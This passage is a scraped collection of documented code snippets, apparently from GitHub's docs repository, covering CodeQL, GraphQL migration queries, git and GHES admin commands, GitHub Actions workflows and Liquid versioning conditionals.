https://github.com/github/docs/blob/main/content/code-security/code-scanning/creating-an-advanced-setup-for-code-scanning/codeql-code-scanning-for-compiled-languages.md#_snippet_8\n\nLANGUAGE: xml\nCODE:\n```\n/p:EmitCompilerGeneratedFiles=true\n```\n\n----------------------------------------\n\nTITLE: Formatting Query History Labels in CodeQL for VS Code (Bash)\nDESCRIPTION: This code represents the default format for displaying query history items in the CodeQL for VS Code extension. The format includes the query name, database name, query status, number of results, and query runtime. Users can override this default format by specifying a different format string in the extension settings.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-for-vs-code/using-the-advanced-functionality-of-the-codeql-for-vs-code-extension/customizing-settings.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nQUERY-NAME on DATABASE-NAME - QUERY-STATUS NUMBER-OF-RESULTS [QUERY-RUNTIME]\n```\n\n----------------------------------------\n\nTITLE: Creating Migration Source with GraphQL\nDESCRIPTION: This GraphQL mutation creates a migration source representing the GitHub.com organization that you want to migrate from. It requires the organization's name and owner ID, and the type is set to GITHUB_ARCHIVE.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/migrating-between-github-products/migrating-repositories-from-githubcom-to-github-enterprise-cloud.md#_snippet_0\n\nLANGUAGE: graphql\nCODE:\n```\nmutation createMigrationSource($name: String!, $ownerId: ID!) {\n  createMigrationSource(input: {name: $name, url: \"https://github.com\", ownerId: $ownerId, type: GITHUB_ARCHIVE}) {\n    migrationSource {\n      id\n      name\n      url\n      type\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Querying Migration Status using GraphQL\nDESCRIPTION: This GraphQL query retrieves the status of a migration given its ID. It returns information such as the migration's state, source URL, migration source name, and failure reason if the migration failed. The query requires the ID of the migration, which is obtained from the `startRepositoryMigration` mutation.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/enterprise-migration-tool/check-migration.md#_snippet_0\n\nLANGUAGE: graphql\nCODE:\n```\nquery (\n  $id: ID!\n){\n  node( id: $id ) {\n    ... on Migration {\n      id\n      sourceUrl\n      migrationSource {\n        name\n      }\n      state\n      failureReason\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Library Pack with Workspace Dependency in YAML\nDESCRIPTION: This YAML snippet defines a library pack `my-company/my-library` that depends on another library pack `my-company/my-library2` within the same workspace.  The `dependencies` section specifies the dependency using the `${workspace}` variable.  The library is set to true and the version is set to 1.2.3.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/about-codeql-workspaces.md#_snippet_4\n\nLANGUAGE: YAML\nCODE:\n```\nname: my-company/my-library\nlibrary: true\nversion: 1.2.3\ndependencies:\n  my-company/my-library2: ${workspace}\n```\n\n----------------------------------------\n\nTITLE: Git Rebase Conflict Error Message\nDESCRIPTION: This code snippet shows the error message that Git displays when a merge conflict occurs during a `git rebase` operation. It highlights the commit causing the conflict and suggests possible actions: abort, skip, or continue after resolving the conflict.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/using-git/resolving-merge-conflicts-after-a-git-rebase.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nerror: could not apply fa39187... something to add to patch A\n\nWhen you have resolved this problem, run \"git rebase --continue\".\nIf you prefer to skip this patch, run \"git rebase --skip\" instead.\nTo check out the original branch and stop rebasing, run \"git rebase --abort\".\nCould not apply fa39187f3c3dfd2ab5faa38ac01cf3de7ce2e841... Change fake file\n```\n\n----------------------------------------\n\nTITLE: Persisting data between jobs in GitHub Actions\nDESCRIPTION: This snippet demonstrates how to persist data between jobs in GitHub Actions using the `upload-artifact` and `download-artifact` actions. The `upload-artifact` action uploads a file as an artifact, and `download-artifact` downloads it in another job.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-circleci-to-github-actions.md#_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\n- name: Upload math result for job 1\n  uses: {% data reusables.actions.action-upload-artifact %}\n  with:\n    name: homework\n    path: math-homework.txt\n\n...\n\n- name: Download math result for job 1\n  uses: {% data reusables.actions.action-download-artifact %}\n  with:\n    name: homework\n```\n\n----------------------------------------\n\nTITLE: Reloading systemd daemon and restarting resolvconf\nDESCRIPTION: These commands reload the systemd daemon to apply the configuration changes made to the `resolvconf` service. Subsequently, the `resolvconf` service is started, resolving the boot issue caused by the missing `/run/resolvconf` directory. These commands are necessary to activate the directory creation and start the service successfully.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/release-notes/2024-08-resolvconf-wont-start.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nsudo systemctl daemon-reload\nsudo systemctl start resolvconf\n```\n\n----------------------------------------\n\nTITLE: Checking GHES Replication Status\nDESCRIPTION: This command displays the replication status of each datastore on a GHES node. It returns `OK`, `WARNING`, or `CRITICAL` status for each replication stream and can exit with different codes depending on the status.  The `-v` and `-vv` options provide additional details.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_76\n\nLANGUAGE: shell\nCODE:\n```\nghe-repl-status\n```\n\nLANGUAGE: shell\nCODE:\n```\nghe-repl-status -v\n```\n\n----------------------------------------\n\nTITLE: Setting Environment Variables in .env File\nDESCRIPTION: This snippet shows the required environment variables for the GitHub App, including the app ID, webhook secret, and private key path. It emphasizes the importance of securing these credentials and preventing accidental commits by including `.env` in `.gitignore`.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/quickstart.md#_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nAPP_ID=\"YOUR_APP_ID\"\nWEBHOOK_SECRET=\"YOUR_WEBHOOK_SECRET\"\nPRIVATE_KEY_PATH=\"YOUR_PRIVATE_KEY_PATH\"\n\n```\n\n----------------------------------------\n\nTITLE: Troubleshooting TLS Error Message\nDESCRIPTION: This `text` snippet represents a security error message that may appear in browser's developer tools related to TLS configuration, specifically concerning Subject Alternative Names (SANs). This message indicates a need to update the Subject Alternative Names in the Let's Encrypt certificate by reissuing it.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/configuring-settings/hardening-security-for-your-enterprise/configuring-tls.md#_snippet_3\n\nLANGUAGE: text\nCODE:\n```\nSecurity error prevented the resource from being loaded\n```\n\n----------------------------------------\n\nTITLE: Concise Python Code for Calculating Area of Shapes\nDESCRIPTION: This is a more concise version of the previous Python code. It removes unnecessary variable assignments and directly prints the results of the area calculation functions. This enhances readability and reduces the amount of code.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/guides-on-using-github-copilot/refactoring-code-with-github-copilot.md#_snippet_5\n\nLANGUAGE: python\nCODE:\n```\nimport math\n\ndef calculate_area_of_rectangle(length, width):\n  return length * width\n\ndef calculate_area_of_circle(radius):\n  return math.pi * (radius ** 2)\n\nprint(f\"Area of rectangle: {calculate_area_of_rectangle(10, 5)}\")\nprint(f\"Area of circle: {calculate_area_of_circle(7)}\")\n```\n\n----------------------------------------\n\nTITLE: Merge Remote as Subtree (Git < 2.9)\nDESCRIPTION: Merges the specified remote branch as a subtree using the 'ours' merge strategy. This prepares Git for adding the remote repository's history as a subdirectory without immediately changing local files. `--no-commit` prevents committing.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/using-git/about-git-subtree-merges.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\ngit merge -s ours --no-commit spoon-knife/main\n```\n\n----------------------------------------\n\nTITLE: Verifying Organization Domain DNS Configuration Using Dig Command\nDESCRIPTION: This command checks if the DNS configuration has been updated with the required TXT record for an organization's domain verification. The command queries the TXT record of the specified domain. Substitute `ORGANIZATION` with the organization's name and `example.com` with the domain in question.\nSOURCE: https://github.com/github/docs/blob/main/content/pages/configuring-a-custom-domain-for-your-github-pages-site/verifying-your-custom-domain-for-github-pages.md#_snippet_1\n\nLANGUAGE: text\nCODE:\n```\ndig _github-pages-challenge-ORGANIZATION.example.com +nostats +nocomments +nocmd TXT\n```\n\n----------------------------------------\n\nTITLE: GraphQL Signature for Repository Pinned Discussions\nDESCRIPTION: This GraphQL signature defines the structure for querying pinned discussions within a repository using the `pinnedDiscussions` field. It includes parameters for pagination (`after`, `before`, `first`, `last`). The return type is a `PinnedDiscussionConnection` object.  Results are ordered by pin position.\nSOURCE: https://github.com/github/docs/blob/main/content/graphql/guides/using-the-graphql-api-for-discussions.md#_snippet_6\n\nLANGUAGE: GraphQL\nCODE:\n```\npinnedDiscussions(\n  after: String,\n  before: String,\n  first: Int,\n  last: Int,\n) : PinnedDiscussionConnection!\n```\n\n----------------------------------------\n\nTITLE: Measuring a CodeQL Dataset\nDESCRIPTION: This command collects statistics about the relations in a specified CodeQL dataset.  It's mainly used when developing a CodeQL extractor, particularly after changes to the database schema, to update the statistics used by the query optimizer. The command requires specifying the dataset and an output file for the statistics.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/dataset-measure.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncodeql dataset measure --output=<file> [--threads=<num>] <options>... -- <dataset>\n```\n\n----------------------------------------\n\nTITLE: Cloning Azure Repos Repository (Git)\nDESCRIPTION: Clones an Azure Repos repository to your local machine using `git clone`. The `--mirror` flag ensures that all branches and tags are cloned. Replace `URL` with the actual clone URL of the Azure DevOps repository.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/importing-source-code/using-the-command-line-to-import-source-code/importing-a-team-foundation-version-control-repository.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ngit clone --mirror URL\n```\n\n----------------------------------------\n\nTITLE: Blocking an IP Address on a Cluster Node (ghe-cluster-block-ip)\nDESCRIPTION: This command blocks a specific IPv4 address on a specified node within the cluster. The command takes the IPv4 address as input and prevents network traffic from that address from reaching the node.  It cannot block the IP of the current host or IPs in the cluster configuration.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_41\n\nLANGUAGE: shell\nCODE:\n```\nghe-cluster-block-ip IPV4 ADDRESS\n```\n\n----------------------------------------\n\nTITLE: Hiding Search Component Temporarily in Search.tsx\nDESCRIPTION: This JavaScript code snippet modifies the Search.tsx component to temporarily hide the search form by adding the `visually-hidden` class. This is done to prevent issues while scraping documentation during the deprecation process. After scraping is complete, this change should be reverted.\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/lib/deprecation-steps.md#_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nreturn (\n  <div data-testid=\"search\">\n    <div className=\"position-relative z-2\">\n      <form\n        role=\"search\"\n        className=\"width-full d-flex visually-hidden\"\n\n```\n\n----------------------------------------\n\nTITLE: Shell Command with Commented Output\nDESCRIPTION: This shell script snippet illustrates the proper way to display a command with its expected output. The output is commented out using `#` to allow users to copy and paste the command directly without executing the output as a command. This avoids modification during copy-paste operations.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/style-guide-and-content-model/style-guide.md#_snippet_5\n\nLANGUAGE: Shell\nCODE:\n```\ngit lfs install\n# Git LFS initialized.\n```\n\n----------------------------------------\n\nTITLE: Recovering from offline error state\nDESCRIPTION: These commands are used to recover a GitHub Enterprise Server staging instance that has been offline for longer than the allowed period. The first command backs up the `server_metadata.json` file, and the second command applies the GitHub Enterprise configuration.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/installing-your-enterprise-server/setting-up-a-github-enterprise-server-instance/setting-up-a-staging-instance.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\nsudo mv /data/user/consul/server_metadata.json /data/user/consul/server_metadata.json.bak\nghe-config-apply\n```\n\n----------------------------------------\n\nTITLE: Setting user.signingkey locally\nDESCRIPTION: Sets the X.509 signing key locally for a specific Git repository.  This ensures that Git will use the specified key when signing commits for only this repository. Replace `0ff455a2708394633e4bb2f88002e3cd80cbd76f` with the correct certificate ID.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/gpg/x-509-key.md#_snippet_7\n\nLANGUAGE: shell\nCODE:\n```\ncd  PATH-TO-REPOSITORY\ngit config --local user.signingkey 0ff455a2708394633e4bb2f88002e3cd80cbd76f\n```\n\n----------------------------------------\n\nTITLE: Specifying Inputs for an Action (YAML)\nDESCRIPTION: This example illustrates how to provide input parameters to an action using the `with` keyword.  Each input parameter is defined as a key-value pair. The action being used needs to define these input parameters in its metadata.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/metadata-syntax-for-github-actions.md#_snippet_10\n\nLANGUAGE: yaml\nCODE:\n```\nruns:\n  using: \"composite\"\n  steps:\n    - name: My first step\n      uses: actions/hello_world@main\n      with:\n        first_name: Mona\n        middle_name: The\n        last_name: Octocat\n```\n\n----------------------------------------\n\nTITLE: Conditional Rendering based on GHES Version\nDESCRIPTION: This snippet demonstrates how to conditionally render content based on whether the GHES version is greater than a specified version (2.13). It uses the `ifversion` tag with the `>` operator.  No external dependencies are required. The output depends on the current GHES version.\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/tests/fixtures/remove-liquid-statements/greater-than.md#_snippet_0\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion ghes > 2.13 %}\n\nAlpha\n\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Copying Conflict CSV to Local - Shell\nDESCRIPTION: This command copies the `conflicts.csv` file from the target GitHub Enterprise Server instance to the local computer using the `scp` command. It utilizes the specified port and requires the target hostname. The copied file can then be reviewed for migration conflicts.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-ghe-migrator/migrating-data-to-github-enterprise-server.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\nscp -P 122 admin@HOSTNAME:conflicts.csv ~/Desktop\n```\n\n----------------------------------------\n\nTITLE: Creating CodeQL Database for Go Project with Build Tracing\nDESCRIPTION: This snippet demonstrates creating a CodeQL database for a Go project by leveraging the `CODEQL_EXTRACTOR_GO_BUILD_TRACING=on` environment variable. This method relies on CodeQL's Go extractor to trace the build process automatically. It assumes Go and CodeQL CLI are installed and properly configured.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/getting-started-with-the-codeql-cli/preparing-your-code-for-codeql-analysis.md#_snippet_10\n\nLANGUAGE: shell\nCODE:\n```\nCODEQL_EXTRACTOR_GO_BUILD_TRACING=on codeql database create go-database --language=go\n```\n\n----------------------------------------\n\nTITLE: Using Comments to Trigger Code Suggestions in Java\nDESCRIPTION: This Java code snippet demonstrates how to use a comment to prompt GitHub Copilot to suggest code. The comment `/*\n * Return the difference between two different integers.\n */` is typed in a Java file, and GitHub Copilot suggests the code to implement the described functionality.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/getting-code-suggestions-in-your-ide-with-github-copilot.md#_snippet_16\n\nLANGUAGE: Java\nCODE:\n```\n/*\n * Return the difference between two different integers.\n */\n```\n\n----------------------------------------\n\nTITLE: Defining Workflow Triggers (schedule and push)\nDESCRIPTION: This snippet configures the workflow to run on push events and on a schedule (every Wednesday at 15:45 UTC). The `cron` expression defines the schedule. The `push` trigger ensures the workflow runs when code is pushed to the repository.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/integrating-with-code-scanning/uploading-a-sarif-file-to-github.md#_snippet_2\n\nLANGUAGE: YAML\nCODE:\n```\non:\n  push:\n  schedule:\n    - cron: '45 15 * * 3'\n```\n\n----------------------------------------\n\nTITLE: Setting user.signingkey globally\nDESCRIPTION: Sets the X.509 signing key globally in Git, using the certificate ID. This allows Git to automatically use the specified key for signing commits across all repositories. Replace `0ff455a2708394633e4bb2f88002e3cd80cbd76f` with your actual certificate ID.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/gpg/x-509-key.md#_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\ngit config --global user.signingkey 0ff455a2708394633e4bb2f88002e3cd80cbd76f\n```\n\n----------------------------------------\n\nTITLE: Defining Arm64 Windows Runner Labels - GitHub Actions\nDESCRIPTION: This code snippet represents the workflow label used to specify the arm64 Windows runner environment in GitHub Actions. The label allows users to select Windows 11 for their jobs running on arm64 architecture, specifically 'windows-11-arm'. This label is used in the workflow configuration file to determine the virtual machine environment for running the job.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/supported-github-runners.md#_snippet_3\n\nLANGUAGE: YAML\nCODE:\n```\nwindows-11-arm\n```\n\n----------------------------------------\n\nTITLE: Conditional Rendering with Nested Version Checks using Liquid\nDESCRIPTION: This snippet demonstrates nested conditional rendering based on the product being FPT and then the GHES version. If the product is FPT, \"Alpha\" is rendered. Otherwise, \"Bravo\" is rendered, followed by \"Charlie\" only if GHES version is 2.13.\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/tests/fixtures/remove-liquid-statements/equals.md#_snippet_2\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion fpt %}\n\nAlpha\n\n{% else %}\n\nBravo\n\n{% ifversion ghes = 2.13 %}\n\nCharlie\n\n{% endif %}\n\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Fetching Data from a Remote Git Repository\nDESCRIPTION: This command fetches updates from a remote Git repository without merging them into the local branches. This ensures the local repository is aware of the latest changes on the remote. The REMOTE argument specifies the name of the remote repository. The expected output is the updated remote tracking branches in your local repository.\nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/committing-changes-to-your-project/troubleshooting-commits/commit-exists-on-github-but-not-in-my-local-clone.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ngit fetch REMOTE\n```\n\n----------------------------------------\n\nTITLE: Configuring Git to use S/MIME globally\nDESCRIPTION: Configures Git to use `smimesign` for S/MIME signing globally. This involves setting the `gpg.x509.program` to `smimesign` and the `gpg.format` to `x509` using the `git config` command with the `--global` flag. This configuration applies to all Git repositories on the system.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/gpg/x-509-key.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngit config --global gpg.x509.program smimesign\ngit config --global gpg.format x509\n```\n\n----------------------------------------\n\nTITLE: Initializing a Git repository for a GitHub CLI extension\nDESCRIPTION: These shell commands initialize a Git repository for a GitHub CLI extension. This includes initializing the repository with `git init`, creating a `.gitignore` file, adding files to version control, committing the initial changes, and pushing the repository to GitHub.\nSOURCE: https://github.com/github/docs/blob/main/content/github-cli/github-cli/creating-github-cli-extensions.md#_snippet_17\n\nLANGUAGE: Shell\nCODE:\n```\ngit init -b main\necho \"gh-EXTENSION-NAME\" >> .gitignore\ngit add main.go go.* .gitignore && git commit -m 'Initial commit'\ngh repo create \"gh-EXTENSION-NAME\"\n```\n\n----------------------------------------\n\nTITLE: Authenticate Octokit client with OAuth token\nDESCRIPTION: This snippet creates an Octokit client instance, authenticating it with an OAuth access token. The access token should be stored as an environment variable for security. This allows the client to make authenticated requests on behalf of the user.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/discovering-resources-for-a-user.md#_snippet_1\n\nLANGUAGE: ruby\nCODE:\n```\n# !!! DO NOT EVER USE HARD-CODED VALUES IN A REAL APP !!!\n# Instead, set and test environment variables, like below.\nclient = Octokit::Client.new :access_token => ENV[\"OAUTH_ACCESS_TOKEN\"]\n```\n\n----------------------------------------\n\nTITLE: Conditional Rendering with Else Clause\nDESCRIPTION: This snippet demonstrates the use of the `else` clause in conjunction with the `ifversion` tag to render different content based on whether the GHES version is greater than 2.13. If the condition is true, \"Alpha\" is rendered; otherwise, \"Bravo\" is rendered.\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/tests/fixtures/remove-liquid-statements/greater-than.md#_snippet_2\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion ghes > 2.13 %}\n\nAlpha\n\n{% else %}\n\nBravo\n\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Deleting codespaces with GitHub CLI using flags\nDESCRIPTION: This snippet demonstrates how to delete multiple codespaces using the GitHub CLI with different flags. It covers deleting all codespaces, codespaces for a specific repository, and codespaces older than a specified number of days. The `--force` flag can be used to skip confirmation prompts.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/developing-in-a-codespace/deleting-a-codespace.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ngh codespace delete --all\n```\n\nLANGUAGE: shell\nCODE:\n```\ngh codespace delete --repo REPOSITORY\n```\n\nLANGUAGE: shell\nCODE:\n```\ngh codespace delete --days NUMBER\n```\n\nLANGUAGE: shell\nCODE:\n```\ngh codespace delete --repo REPOSITORY --days NUMBER\n```\n\n----------------------------------------\n\nTITLE: Trigger workflow on merged pull request\nDESCRIPTION: This workflow triggers when a pull request closes, and the `if_merged` job only runs if the pull request was merged. It demonstrates using the `pull_request_target` `closed` event type with a conditional checking `github.event.pull_request.merged`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_34\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  pull_request_target:\n    types:\n      - closed\n\njobs:\n  if_merged:\n    if: github.event.pull_request.merged == true\n    runs-on: ubuntu-latest\n    steps:\n    - run: |\n        echo The PR was merged\n```\n\n----------------------------------------\n\nTITLE: Configuring authProvider in VS Code settings.json\nDESCRIPTION: This snippet shows how to add the `authProvider` setting to the `settings.json` file in VS Code to authenticate GitHub Copilot with a GitHub Enterprise account.  This configuration tells VS Code to use the GitHub Enterprise authentication provider.  Requires VS Code and the GitHub Copilot extension to be installed.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/managing-copilot/configure-personal-settings/using-github-copilot-with-an-account-on-ghecom.md#_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n   \"github.copilot.advanced\": {\n        \"authProvider\": \"github-enterprise\"\n   }\n```\n\n----------------------------------------\n\nTITLE: Disabling Dependabot Enforcement for Workflows (Shell)\nDESCRIPTION: This snippet shows how to disable the limitations on workflows triggered by Dependabot on GitHub Enterprise Server. This allows Dependabot-triggered workflows to access secrets and increased permissions. The configuration change requires applying the new settings for it to take effect.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-github-actions-for-your-enterprise/advanced-configuration-and-troubleshooting/troubleshooting-github-actions-for-your-enterprise.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nghe-config app.actions.disable-dependabot-enforcement true\n```\n\nLANGUAGE: shell\nCODE:\n```\nghe-config-apply\n```\n\n----------------------------------------\n\nTITLE: Displaying Forecast Options - Bash\nDESCRIPTION: This command displays available options for the `forecast` subcommand of the GitHub Actions Importer CLI.  The `forecast` subcommand reviews historical pipeline usage to estimate future GitHub Actions usage. The `-h` flag shows the help message.  The command is executed via the `gh` CLI.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/automating-migration-with-github-actions-importer.md#_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\n$ gh actions-importer forecast -h\n```\n\n----------------------------------------\n\nTITLE: Showing Trust Policies Helm Values\nDESCRIPTION: This command displays the configurable values for the trust-policies Helm chart. This is useful for understanding all available options and their default settings. It uses the `helm show values` command.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/using-artifact-attestations/enforcing-artifact-attestations-with-a-kubernetes-admission-controller.md#_snippet_7\n\nLANGUAGE: bash\nCODE:\n```\nhelm show values oci://ghcr.io/github/artifact-attestations-helm-charts/trust-policies --version v0.6.2\n```\n\n----------------------------------------\n\nTITLE: Listing SSH Keys with MD5 Fingerprint\nDESCRIPTION: This snippet lists the SSH keys that have been added to the SSH agent, displaying their MD5 fingerprint.  This snippet is specific for OpenSSH versions 6.8 or newer.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/troubleshooting-ssh/error-permission-denied-publickey.md#_snippet_7\n\nLANGUAGE: Shell\nCODE:\n```\n$ ssh-add -l -E md5\n> 2048 MD5:a0:dd:42:3c:5a:9d:e4:2a:21:52:4e:78:07:6e:c8:4d /Users/USERNAME/.ssh/id_rsa (RSA)\n```\n\n----------------------------------------\n\nTITLE: Example .env file with GitHub App Credentials\nDESCRIPTION: This snippet provides an example `.env` file populated with sample GitHub App credentials, including a placeholder private key.  This is intended as a visual aid, and users should replace the placeholders with their actual credentials.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-ci-checks-with-a-github-app.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\nGITHUB_APP_IDENTIFIER=12345\nGITHUB_WEBHOOK_SECRET=your webhook secret\nGITHUB_PRIVATE_KEY=\"-----BEGIN RSA PRIVATE KEY-----\n...\nHkVN9...\n...\n-----END RSA PRIVATE KEY-----\"\n```\n\n----------------------------------------\n\nTITLE: Set Git SSH Signing Key Globally\nDESCRIPTION: This command configures Git to use the specified SSH public key for signing commits. It sets the `user.signingkey` configuration option globally, meaning it applies to all Git repositories for the current user. Replace `/PATH/TO/.SSH/KEY.PUB` with the actual path to your public key file.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/gpg/paste-ssh-public-key.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ngit config --global user.signingkey /PATH/TO/.SSH/KEY.PUB\n```\n\n----------------------------------------\n\nTITLE: SSH Access to Administrative Shell\nDESCRIPTION: This code snippet demonstrates how to SSH into a {% data variables.product.prodname_ghe_server %} instance as the 'admin' user using port 122.  Replace 'HOSTNAME' with the actual hostname or IP address of the server. It is assumed that SSH access has been configured for the instance.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/enterprise_installation/ssh-into-target-instance.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nssh -p 122 admin@HOSTNAME\n```\n\n----------------------------------------\n\nTITLE: Reclaiming individual mannequin with gh bbs2gh\nDESCRIPTION: This command reclaims an individual mannequin and associates it with a target user. The `DESTINATION` parameter specifies the GitHub organization, `MANNEQUIN` specifies the mannequin username, and `USERNAME` specifies the target user to whom the mannequin's contributions should be attributed.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/completing-your-migration-with-github-enterprise-importer/reclaiming-mannequins-for-github-enterprise-importer.md#_snippet_8\n\nLANGUAGE: Shell\nCODE:\n```\ngh bbs2gh reclaim-mannequin --github-org DESTINATION --mannequin-user MANNEQUIN --target-user USERNAME\n```\n\n----------------------------------------\n\nTITLE: Handling Merge Conflicts with Git Merge\nDESCRIPTION: This code snippet demonstrates the output you would get when attempting a git merge that results in a conflict. It shows the files that are conflicted and instructs the user to fix the conflicts and then commit the result.\nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/collaborating-with-pull-requests/addressing-merge-conflicts/about-merge-conflicts.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n$ git merge BRANCH-NAME\n> Auto-merging styleguide.md\n> CONFLICT (content): Merge conflict in styleguide.md\n> Automatic merge failed; fix conflicts and then commit the result\n```\n\n----------------------------------------\n\nTITLE: Writing Math Expressions as Blocks with $$ Delimiters\nDESCRIPTION: This snippet demonstrates how to write mathematical expressions as blocks using double dollar signs ($$) as delimiters in Markdown on GitHub. The expression is placed on a new line and enclosed in the delimiters.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/writing-on-github/working-with-advanced-formatting/writing-mathematical-expressions.md#_snippet_2\n\nLANGUAGE: text\nCODE:\n```\n**The Cauchy-Schwarz Inequality**\\ \n$$\\left( \\sum_{k=1}^n a_k b_k \\right)^2 \\leq \\left( \\sum_{k=1}^n a_k^2 \\right) \\left( \\sum_{k=1}^n b_k^2 \\right)$$\n```\n\n----------------------------------------\n\nTITLE: Configuring Workflow to Trigger on Label Creation\nDESCRIPTION: This snippet configures a GitHub Actions workflow to trigger only when a label is created.  It uses the `on` keyword to specify the `label` event, and the `types` keyword to filter for the `created` activity type.  The workflow will not run when a label is edited or deleted.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/actions-activity-types.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\non:\n  label:\n    types:\n      - created\n```\n\n----------------------------------------\n\nTITLE: Nested Conditional Rendering with GHES and FPT using Liquid\nDESCRIPTION: This snippet demonstrates nested conditional rendering based on the GHES version first, then the FPT product. If the GHES version is 2.13, \"Alpha\" is rendered, and if the product is also FPT, \"Bravo\" is rendered. Otherwise, \"Charlie\" is displayed.\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/tests/fixtures/remove-liquid-statements/equals.md#_snippet_4\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion ghes = 2.13 %}\n\nAlpha\n\n{% ifversion fpt %}\n\nBravo\n\n{% endif %}\n\n{% else %}\n\nCharlie\n\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Deeply Nested Conditional (Liquid)\nDESCRIPTION: This Liquid snippet demonstrates a deeply nested `ifversion` conditional. The outer `ifversion` checks for fpt, ghes, ghae, or ghec. If true, it checks for fpt or ghec. If that's true, it checks for ghae. If all are true, \"Charlie\" is rendered.\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/tests/fixtures/remove-liquid-statements/unnecessary.md#_snippet_3\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion fpt or ghes or ghae or ghec %}\nAlpha\n  {% ifversion fpt or ghec %}\n  Bravo\n    {% ifversion ghae %}\n    Charlie\n    {% endif %}\n  {% endif %}\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Finding Organization Project Node ID (gh cli)\nDESCRIPTION: This snippet demonstrates how to find the node ID of an organization project using the GitHub CLI with a GraphQL query. Replace `ORGANIZATION` with the organization name and `NUMBER` with the project number. Authentication with `gh auth login --scopes \"project\"` or `gh auth login --scopes 